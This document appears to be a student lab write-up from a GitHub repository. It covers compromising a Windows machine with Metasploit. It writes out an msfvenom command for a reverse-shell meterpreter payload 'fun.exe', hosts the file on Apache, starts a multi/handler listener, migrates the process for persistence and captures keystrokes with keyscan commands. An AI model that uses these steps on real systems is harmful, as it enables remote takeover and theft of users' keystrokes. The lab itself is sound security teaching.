# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/e9db632c-5913-4108-bf68-ae3f8c5f44df)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/a04c7d0c-7627-4785-aec1-f893d1ca05a2)


copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/986db1a9-9f63-43d2-8df8-e5d421db2f56)

Start apache server sudo systemctl apache2 start 

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/e05fe76c-3e28-46f9-80fd-d9e4d4c2cbae)


Check the status of apache2 

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/9efed500-0b13-4c61-98b8-551a621e22d9)


Invoke msfconsole: Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/df20f4e5-1bff-49f7-a7f9-eee70aea4d20)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.


![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/3f0de5f4-8201-4b8d-8085-b2830e55f966)


Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit 

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/f2faefbc-3d89-4213-8f08-bac5789b4480)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:


migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted


![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/3655a3e1-1b91-43e5-b221-c77662d1ed9e)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/99608f54-d297-4201-8d17-91b2d6152760)


keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/128350225/adfe4b27-660d-44a1-8e53-03d7e359788b)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
